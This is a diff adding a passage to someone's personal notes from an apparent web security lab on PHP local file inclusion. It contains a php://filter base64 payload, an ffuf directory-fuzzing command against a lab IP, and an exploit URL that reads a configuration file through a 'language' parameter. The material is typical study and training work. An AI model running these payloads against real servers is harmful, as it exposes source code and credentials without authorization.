@@ -24,4 +24,19 @@ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:
 
 
 ## Standard PHP Inclusion
+Many .php files do not print to the screen because they don't render HTML output and instead execute code. Therefore, use the base64 php filter.
+In the case that the web app does not execute code, it will show the source code.
 
+## Source Code Disclosure
+```url
+php://filter/read=convert.base64-encode/resource=config
+echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+```
+- This web app appends .php to the url, so we purposefully left it out
+
+```shell-session
+ffuf -ac -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.48.12:46011/FUZZ.php
+```
+```
+http://94.237.48.12:46011/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+```
